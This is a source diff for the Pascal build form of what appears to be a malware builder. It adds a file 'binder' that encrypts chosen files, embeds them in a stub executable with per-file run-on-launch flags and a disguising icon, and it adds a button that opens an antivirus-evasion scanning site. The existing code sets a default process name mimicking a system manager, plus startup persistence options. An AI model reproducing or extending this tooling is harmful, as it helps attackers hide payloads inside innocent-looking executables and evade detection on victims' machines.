@@ -7,18 +7,33 @@ interface
 uses
   Classes, Windows, FileUtil, Forms, Controls, Graphics,
   Dialogs, ComCtrls, ExtCtrls, StdCtrls, Menus, BCButton, BCTypes,
-  SysUtils, LCLType, IdHTTP, INIFiles, Logic;
+  SysUtils, LCLType, CheckLst, IdHTTP, INIFiles, Logic, LCLIntf;
 
 type
 
   { TBuildForm }
 
   TBuildForm = class(TForm)
+    ClearButton: TBCButton;
+    AddFileButton: TBCButton;
+    SelectFile: TOpenDialog;
+    RemFileButton: TBCButton;
+    BackShape1: TShape;
+    BindButton: TBCButton;
+    SelectDir: TSelectDirectoryDialog;
+    UpOrderButton: TBCButton;
+    DownOrderButton: TBCButton;
+    ToggleExecuteButton: TBCButton;
     BaseLocLabel: TLabel;
     BaseLocButton: TBCButton;
+    AddDirButton: TBCButton;
     BindPanel: TPanel;
     AboutPanel: TPanel;
+    BBrowseButton: TBCButton;
+    BDefaultIcon: TBCButton;
+    FileListBox: TCheckListBox;
     Hat: TIdHTTP;
+    BIconImage: TImage;
     SaveButton: TBCButton;
     BuildStatLabel: TLabel;
     SaveDialog: TSaveDialog;
@@ -74,9 +89,14 @@ type
     MenuSeparator: TShape;
     TopMenu: TPanel;
     DelaySelector: TUpDown;
+    procedure AddDirButtonClick(Sender: TObject);
+    procedure AddFileButtonClick(Sender: TObject);
+    procedure BindButtonClick(Sender: TObject);
     procedure BrowseButtonClick(Sender: TObject);
     procedure BuildButtonClick(Sender: TObject);
+    procedure ClearButtonClick(Sender: TObject);
     procedure DefaultIconClick(Sender: TObject);
+    procedure DownOrderButtonClick(Sender: TObject);
     procedure FormCreate(Sender: TObject);
     procedure FormDestroy(Sender: TObject);
     procedure LocMenuDrawItem(Sender: TObject; ACanvas: TCanvas; ARect: TRect;
@@ -85,8 +105,6 @@ type
       AHeight: Integer);
     procedure MenuClick(Sender: TObject);
     procedure CloseButtonClick(Sender: TObject);
-    procedure LocalAppItemClick(Sender: TObject);
-    procedure MenuItem(Sender: TObject);
     procedure MinimizeButtonClick(Sender: TObject);
     procedure MoveButtonMouseDown(Sender: TObject; Button: TMouseButton;
       Shift: TShiftState; X, Y: Integer);
@@ -96,7 +114,11 @@ type
       Shift: TShiftState; X, Y: Integer);
     procedure MenuItemClick(Sender: TObject);
     procedure RandButtonClick(Sender: TObject);
+    procedure RemFileButtonClick(Sender: TObject);
     procedure SaveButtonClick(Sender: TObject);
+    procedure ScanButtonClick(Sender: TObject);
+    procedure ToggleExecuteButtonClick(Sender: TObject);
+    procedure UpOrderButtonClick(Sender: TObject);
   private
 
   public
@@ -108,6 +130,7 @@ type
     function BuildFile: Boolean;
     function CheckBuild: Boolean;
     procedure Log(StrToLog: String);
+    function CanAddToList(FileName: String): Boolean;
   end;
 
 var
@@ -115,7 +138,7 @@ var
   PX, PY: Integer;
   MouseIsDown: Boolean;
 
-  IconLoc, BaseLoc: String;
+  IconLoc, BIconLoc, BaseLoc: String;
 
   Settings: TINIFile;
 
@@ -227,10 +250,8 @@ Begin
   if Not(Result) then Exit;
 
   try
-    Res:=BeginUpdateResource('Build.exe', True);
+    Res:=BeginUpdateResource('Build.exe', False);
     UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @SCast.Text[1], Length(SCast.Text));
-    SCast.LoadFromFile('mod\netmodule.lfm');
-    UpdateResource(Res, RT_RCDATA, 'TNet', LANG_NEUTRAL, @SCast.Text[1], Length(SCast.Text));
     EndUpdateResource(Res, False);
     if FileExists(IconLoc) then Begin
       ChangeIcon('Build.exe', IconLoc);
@@ -272,6 +293,8 @@ Begin
   if Not(FileExists(IconLoc)) then IconLoc:='';
   if Length(IconLoc)>0 then IconImage.Picture.LoadFromFile(IconLoc)
   else IconImage.Picture.LoadFromFile('img\default.ico');
+  BIconLoc:='';
+  BIconImage.Picture.LoadFromFile('img\default.ico');
   IntEdit.Text:=Settings.ReadString('Build', 'InternalName', 'winmgr.exe');
   DelaySelector.Position:=Settings.ReadInteger('Build', 'Delay', 5000);
   Case Settings.ReadInteger('Build', 'Startup', 3) of
@@ -370,16 +393,6 @@ begin
   Close;
 end;
 
-procedure TBuildForm.LocalAppItemClick(Sender: TObject);
-begin
-
-end;
-
-procedure TBuildForm.MenuItem(Sender: TObject);
-begin
-
-end;
-
 procedure TBuildForm.MenuClick(Sender: TObject);
 begin
   ChangeTab((Sender as TComponent).Name);
@@ -428,13 +441,117 @@ end;
 procedure TBuildForm.BrowseButtonClick(Sender: TObject);
 begin
   if IconDialog.Execute then Begin
-    IconLoc:=IconDialog.FileName;
     try
-      IconImage.Picture.LoadFromFile(IconLoc);
+      if (Sender as TComponent).Name='BrowseButton' then Begin
+        IconLoc:=IconDialog.FileName;
+        IconImage.Picture.LoadFromFile(IconLoc);
+      end else Begin
+        BIconLoc:=IconDialog.FileName;
+        BIconImage.Picture.LoadFromFile(BIconLoc);
+      end;
     except
       ShowMessage('Failed to load icon!');
       IconLoc:='';
+      BIconLoc:='';
     end;
+  end;
+end;
+
+function TBuildForm.CanAddToList(FileName: String): Boolean;
+var
+  J: LongInt;
+Begin
+  Result:=True;
+  For J:=0 to FileListBox.Items.Count-1 do
+    if LowerCase(ExtractFileName(FileListBox.Items.Strings[J]))=LowerCase(FileName) then Begin
+      Result:=False;
+      Break;
+    end;
+end;
+
+procedure TBuildForm.AddDirButtonClick(Sender: TObject);
+var
+  SR: TSearchRec;
+  Found: Boolean;
+  _Path: String;
+  J: LongInt = 0;
+begin
+  if SelectDir.Execute then Begin
+    _Path:=IncludeTrailingBackslash(SelectDir.FileName);
+    Found:=(FindFirst(_Path+'*.*', faAnyFile-faDirectory, SR) = 0);
+    While Found do Begin
+      if CanAddToList(SR.Name) then Begin
+        Inc(J);
+        FileListBox.Items.Add(_Path+SR.Name);
+      end;
+      Found:=(FindNext(SR))=0;
+    end;
+    FindClose(SR);
+    ShowMessage('Successfully added '+IntToStr(J)+' files!');
+  end;
+end;
+
+procedure TBuildForm.AddFileButtonClick(Sender: TObject);
+begin
+  if SelectFile.Execute then Begin
+    if CanAddToList(ExtractFileName(SelectFile.FileName)) then
+      FileListBox.Items.Add(SelectFile.FileName)
+    else
+      ShowMessage('A file with this name already exists in the list!');
+  end;
+end;
+
+procedure TBuildForm.BindButtonClick(Sender: TObject);
+var
+  Settings: TMemINIFile;
+  SCast: TStringList;
+  MS: TMemoryStream;
+  J: LongInt;
+  Error: Boolean = False;
+
+  Res: THandle;
+
+begin
+  if SaveDialog.Execute then Begin
+    BindButton.Enabled:=False;
+    FileListBox.Enabled:=False;
+    try
+    CopyFile('mod\BindPack\BindPack.exe', 'Bind.exe', True);
+    Res:=BeginUpdateResource('Bind.exe', False);
+    MS:=TMemoryStream.Create;
+    For J:=0 to FileListBox.Items.Count-1 do Begin
+      MS.LoadFromFile(FileListBox.Items.Strings[J]);
+      MS.Position:=0;
+      ToggleCrypt(MS, 7019);
+      UpdateResource(Res, RT_RCDATA, PChar('File'+IntToStr(J)), LANG_NEUTRAL, MS.Memory, MS.Size);
+      MS.Clear;
+    end;
+    Settings:=TMemINIFile.Create(MS);
+    Settings.WriteInteger('General', 'FileCount', FileListBox.Items.Count);
+    For J:=0 to FileListBox.Items.Count-1 do Begin
+      Settings.WriteString(IntToStr(J), 'FileName', ExtractFileName(FileListBox.Items.Strings[J]));
+      Settings.WriteBool(IntToStr(J), 'Execute', FileListBox.Checked[J]);
+    end;
+    SCast:=TStringList.Create;
+    Settings.GetStrings(SCast);
+    Settings.Free;
+    MS.Free;
+    UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @SCast.Text[1], Length(SCast.Text));
+    EndUpdateResource(Res, False);
+    SCast.Free;
+    if FileExists(BIconLoc) then
+      ChangeIcon('Bind.exe', BIconLoc);
+    CopyFile('Bind.exe', SaveDialog.FileName, True);
+    DeleteFile('Bind.exe');
+    except
+      On E: Exception do Begin
+        ShowMessage('Error while binding: '+E.Message);
+        Error:=True;
+      end;
+    end;
+    FileListBox.Enabled:=True;
+    BindButtonEnabled:=True;
+    if Not(Error) then ShowMessage('Success!');
   end;
 end;
 
@@ -449,10 +566,42 @@ begin
       end;
 end;
 
+procedure TBuildForm.ClearButtonClick(Sender: TObject);
+begin
+  FileListBox.Items.Clear;
+end;
+
 procedure TBuildForm.DefaultIconClick(Sender: TObject);
 begin
-  IconLoc:='';
-  IconImage.Picture.LoadFromFile('img\exe_big.png');
+  if (Sender as TComponent).Name='DefaultIcon' then Begin
+    IconLoc:='';
+    IconImage.Picture.LoadFromFile('img\exe_big.png');
+  end else Begin
+    BIconLoc:='';
+    BIconImage.Picture.LoadFromFile('img\exe_big.png');
+  end;
+end;
+
+procedure TBuildForm.DownOrderButtonClick(Sender: TObject);
+var
+  J: LongInt;
+  TS: String;
+  TC: Boolean;
+begin
+  if FileListBox.SelCount=1 then Begin
+    For J:=0 to FileListBox.Items.Count-1 do
+      if FileListBox.Selected[J] then Break;
+    if J<FileListBox.Items.Count-1 then Begin
+      TS:=FileListBox.Items.Strings[J];
+      FileListBox.Items.Strings[J]:=FileListBox.Items.Strings[J+1];
+      FileListBox.Items.Strings[J+1]:=TS;
+      TC:=FileListBox.Checked[J];
+      FileListBox.Checked[J]:=FileListBox.Checked[J+1];
+      FileListBox.Checked[J+1]:=TC;
+      FileListBox.Selected[J]:=False;
+      FileListBox.Selected[J+1]:=True;
+    end;
+  end;
 end;
 
 procedure TBuildForm.MinimizeButtonClick(Sender: TObject);
@@ -514,10 +663,51 @@ Begin
   GenMutex;
 end;
 
+procedure TBuildForm.RemFileButtonClick(Sender: TObject);
+begin
+  FileListBox.DeleteSelected;
+end;
+
 procedure TBuildForm.SaveButtonClick(Sender: TObject);
 begin
   SaveSettings;
   ShowMessage('Settings saved! Please restart the builder for the changes to take effect!');
+end;
+
+procedure TBuildForm.ScanButtonClick(Sender: TObject);
+begin
+  OpenURL('https://antiscan.me/');
+end;
+
+procedure TBuildForm.ToggleExecuteButtonClick(Sender: TObject);
+var
+  J: LongInt;
+begin
+  For J:=0 to FileListBox.Items.Count-1 do
+    if FileListBox.Selected[J] then
+      FileListBox.Checked[J]:=Not(FileListBox.Checked[J]);
+end;
+
+procedure TBuildForm.UpOrderButtonClick(Sender: TObject);
+var
+  J: LongInt;
+  TS: String;
+  TC: Boolean;
+begin
+  if FileListBox.SelCount=1 then Begin
+    For J:=0 to FileListBox.Items.Count-1 do
+      if FileListBox.Selected[J] then Break;
+    if J>0 then Begin
+      TS:=FileListBox.Items.Strings[J];
+      FileListBox.Items.Strings[J]:=FileListBox.Items.Strings[J-1];
+      FileListBox.Items.Strings[J-1]:=TS;
+      TC:=FileListBox.Checked[J];
+      FileListBox.Checked[J]:=FileListBox.Checked[J-1];
+      FileListBox.Checked[J-1]:=TC;
+      FileListBox.Selected[J]:=False;
+      FileListBox.Selected[J-1]:=True;
+    end;
+  end;
 end;
 
 end.
